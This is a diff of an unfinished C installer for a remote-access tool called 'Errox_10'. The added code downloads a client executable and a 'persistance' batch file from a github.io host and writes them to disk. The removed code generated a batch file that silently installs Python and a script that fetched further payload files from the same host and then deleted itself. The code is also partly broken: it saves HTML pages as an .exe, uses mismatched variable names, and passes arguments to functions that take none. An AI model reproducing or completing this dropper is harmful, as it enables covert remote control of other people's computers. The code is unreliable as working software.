@@ -1,48 +1,147 @@
+// Basic headers for C files
 #include <stdio.h>
 #include <stdbool.h>
+// Getting the windows header for Internet and System to make internet connections and create the file(s) needed
 #include <Windows.h>
+#include <wininet.h>
+// Linking wininet.lib to this file, so it can use the syscalls without needing to use the Windows API
+#pragma comment(lib, "wininet.lib")
+
+int DownloadFromWeb(char *url, char* outputFile)
+{
+    HINTERNET handleInternet, handleConnection;
+    DWORD bytesRead;
+    FILE *fptr;
+    // Initalizing the internet connection, by allowing this application to connect through the default connected internet
+    handleInternet = InternetOpen(TEXT("Downloader"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (handleInternet == NULL)
+    {
+        printf("[!] ERROR 02: Problem encountered when creating internet connection.\n[#] Rerun with offline mode selected\n");
+        return 1;
+    }
+    // Opening the URL
+    handleConnection = InternetOpenUrl(handleInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
+    if (handleConnection == NULL)
+    {
+        // Closing the internet connection just in case due to the connection failing
+        InternetCloseHandle(handleInternet);
+        printf("[!] ERROR 03: Problem enountered when connecting to download page.\n[#] Rerun with offline mode selected\n");
+        return 2;
+    }
+    // Opening the output file in write binary mode, so that the output is writen from the internet
+    fptr = fopen(outputFile, "wb");
+    // If the file cant open (write protected directory/enviorment) close all outbound connections
+    if (fptr == NULL)
+    {
+        InternetCloseHandle(handleConnection);
+        InternetCloseHandle(handleInternet);
+        printf("[!] ERROR 04: Problem encountered when opening the destination file.\n[#] Rerun with admin permitions.\n");
+        return 3;
+    }
+    // Creating a buffer for the read data
+    BYTE buffer[4096];
+    // Writing to the file while there is more data to read
+    while (InternetReadFile(handleConnection, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0)
+    {
+        fwrite(buffer, 1, bytesRead, fptr);
+    }
+    // Closing the file and internet connections
+    fclose(fptr);
+    InternetCloseHandle(handleConnection);
+    InternetCloseHandle(handleInternet);
+    printf("Errox_10_client.exe and its persistance Errox_10_persistance.bat were installed with no errors.\n");
+    return 0;
+}
+
+int InstallClient()
+{
+    int commandResult;
+    // Creating a file opening variable
+    FILE *fptr;
+    // Creating the files by hand...AAAAGGGGGHHHHH!!!
+    const char *embededErrox_10 = "[embeded data]";
+    const char *erroxfileName = "Errox_10_client.exe";
+    const char *embededPersistance = "[embeded data]";
+    const char *persistanceFileName = "Errox_10_persistance.bat";
+    return 0;
+}
+
+int InstallServer()
+{
+    int commandResult;
+    // Creating a file opening variable
+    FILE *fptr;
+    // Creating the files by hand...AAAAGGGGGHHHHH!!!
+    const char *embededErrox_10 = "[embeded data]";
+    const char *erroxfileName = "Errox_10_server.exe";
+    return 0;
+}
 
 int main()
 {
     int mode;
-    bool loopCheck = true;
-    while (loopCheck)
+    int offlineInstall;
+    int installReturnValue;
+    bool mainLoopCheck = true;
+
+    while (mainLoopCheck)
     {
         //Getting the instalation method through a multable choice
-        printf("[+] Which instalation method do you wish to use\n[1] Create Server\n[2] Create Client\n[3] Help\n");
+        printf("[+] Which instalation method do you wish to use\n[1] Create Server (online install)\n[2] Create Server (offline install)\n[3] Create Client (online install)\n[4] Create Client (install offline)\n[5] Help\n[6] Close this program\n");
         printf(">");
         scanf("%d", &mode);
         switch (mode)
         {
+            // Would create the seever script for this computer through an online install
+            // Work in progress
             case 1:
-                printf("Work in progress\n");
-                loopCheck = false;
+                fflush(stdin);
+                installReturnValue = DownloadFromWeb("temp", "temp");
                 break;
+            // Would create the server script for this computer through on offline install
+            // Work in progress 
             case 2:
-                // Creating a file opening variable
-                FILE *fptr;
-                // Creating a batch file for checking that python version and so forth
-                fptr = fopen("systemCheck.bat", "w");
-                fprintf(fptr, "@echo off\nsetlocal\necho Checking For Python\nwhere python >nul 2>&1\nif %%errorLevel%% equ 0 (\n\techo Python Installed\n\tgoto installed\n) else (\n\tset \"pythonURL=https://www.python.org/ftp/python/3.10.5/python-3.10.5-amd64.exe\"\n\tset \"pythonInstaller=python-3.10.5-amd64.exe\"\n\tbitsadmin /transfer mydownloadjob /download /priority normal %%pythonInstallerUrl%% %%pythonInstaller%%\n\tif not exist %%pythonInstaller%% (\n\t\techo Failed to Install Python, do it manually\n\t\tgoto end\n\t) else (\n\t\t%%pythonInstaller%% /quiet InstallAllUsers=1 PrependPath=1\n\t)\n\twhere python >nul 2>&1\n\tif %%errorLevel%% equ 0(\n\t\techo Python Installed safely.\n\t) else (\n\t\techo Python didnt Install correctly, install it manually.\n\t)\n)");
-                fclose(fptr);
-                // Creating a python file for installing the page information
-                fptr = fopen("install.py", "w");
-                fprintf(fptr, "import requests\nimport os\nimport sys\n \ndef getInbetween(text_in, start_point, end_point):\n\tstart_index = text_in.find(start_point)\n\tend_index = text_in.find(end_point, start_index + len(start_point))\n\tif start_index != -1 and end_index != -1:");
-                fprintf(fptr, "\n\t\treturn text_in[start_index + len(start_point):end_index]\n \nurl = \"https://vel2006.github.io/Errox_10/Windows.html\"\nres = requests.get(url)\nif res.status_code == 200:\n\tsource = getInbetween(res.text, \"<body>\", \"</body>\")");
-                fprintf(fptr, "\n\tfor line in source.splitlines():\n\t\tif \"<p>\" in line:\n\t\t\twith open(os.getcwd()+\"\\Bordie.py\", 'a') as file:\n\t\t\t\tfile.write((getInbetween(line, \"<p>\", \"</p>\")) + '\\n')\n\turl = \"https://vel2006.github.io/Errox_10/Windows_Per.html\"");
-                fprintf(fptr, "\n\tres2 = requests.get(url)\n\tif res2.status_code == 200:\n\t\tsource2 = getInbetween(res2.text, \"<body>\", \"</body>\")\n\t\tfor line in source2.splitlines():\n\t\t\tif \"<p>\" in line:\n\t\t\t\twith open(os.getcwd()+\"\\Per.bat\", 'a') as file:");
-                fprintf(fptr, "\n\t\t\t\t\tfile.write((getInbetween(line, \"<p>\", \"</p>\")) + '\\n')\nelse:\n\ttry:\n\t\tos.remove(os.getcwd()+\"\\runner.bat\")\n\t\tos.remove(os.getcwd()+\"\\Install.py\")\n\texcept OSError as error:\n\t\tpass");
-                fclose(fptr);
-                loopCheck = false;
+                fflush(stdin);
+                installReturnValue = InstallServer(true);
                 break;
+            // Would create the client script for this computer through an online install
+            // Work in progress
             case 3:
-                printf("[+] Help menu:\n[#] Server mode: Used on the admin side of Errox_10. It will allow you to see the device's usage and remotly access a client through it's CMD\n[#] Client mode: Used on the client side of Errox_10. It is what allows 'server' mode to access the client and get its information.\n");
-                printf("[+] Support the creator at:\n[#] https:github.com/vel2006\n[#] https://www.youtube.com/@That1EthicalHacker");
+                fflush(stdin);
+                char* exeName = "Errox_10_client.exe";
+                char* perName = "Errox_10_persistance.bat";
+                DownloadFromWeb("https://vel2006.github.io/Errox_10/Windows.html", exeName);
+                DownloadFromWeb("https://vel2006.github.io/Errox_10/Windows_Per.html", perName);
+                break;
+            // Would create the client script for this computer through an offline install
+            // Work in progress
+            case 4:
+                fflush(stdin);
+                installReturnValue = InstallClient(true);
+                // Handling the return codes
+                switch (installReturnValue)
+                {
+                    case 0:
+                        printf("Errox_10_client.exe and its persistance Errox_10_persistance.bat were installed with no errors.\n");
+                        break;
+                }
+                break;
+            // Displays the help menu that describes all of the instalation methods and what they mean
+            case 5:
+                fflush(stdin);
+                printf("[+] Help menu:\n[#] Server mode: Used on the admin side of Errox_10. It will allow you to see the device's usage and remotly access a client through it's CMD. It can be installed using online or offline modes, online makes page requests through python to automate the creation. Offline creates Errox_10 through this exe file and is faster, but creates an outdated version which is not recommended.\n[#] Client mode: Used on the client side of Errox_10. It is what allows 'server' mode to access the client and get its information. It can be installed using online or offline modes, online makes page requests through python to automate the creation. Offline creates Errox_10 through this exe file and is faster, but creates an outdated version which is not recommended.\n");
+                printf("[+] Support the creator at:\n[#] https://github.com/vel2006\n[#] https://www.youtube.com/@That1EthicalHacker");
+                break;
+            case 6:
+                fflush(stdin);
+                printf("[+] User selected 6, closing program.\n");
+                mainLoopCheck = false;
+                break;
+            // Bingus Dingus selected something invalid
             default:
-                printf("[+] Error, invalid option.\n[#] Options are:\n[1] = Installs server mode for Errox_10\n[2] = Installs client mode for Errox_10\n[3] = Displays help menu\n");
+                fflush(stdin);
+                printf("[!] ERROR 01: invalid option on instalation mode selection.\n[#] Options are:\n[1] = Installs server mode for Errox_10 through page requests.\n[2] = Installs server mode for Errox_10 through hard-coded lines.\n[3] = Installs client mode for Errox_10 through page requests.\n[4] = Installs client mode for Errox_10 through hard-coded lines.\n[5] = Displays help menu\n[6] = Close this program\n");
         }
     }
-    printf("[+] Press <Enter> To Quit ...");
-    getchar();
     return 0;
 }
